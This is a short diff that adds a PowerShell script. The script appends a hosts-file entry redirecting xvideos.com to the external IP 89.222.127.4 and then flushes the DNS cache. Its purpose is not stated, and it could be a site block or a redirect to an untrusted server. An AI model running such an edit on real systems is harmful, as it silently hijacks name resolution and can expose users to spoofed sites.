@@ -1,0 +1,3 @@
+$entry = "`n89.222.127.4 www.xvideos.com xvideos.com"
+Add-Content -Path "$env:SystemRoot\System32\drivers\etc\hosts" -Value $entry
+ipconfig /flushdns | Out-Null
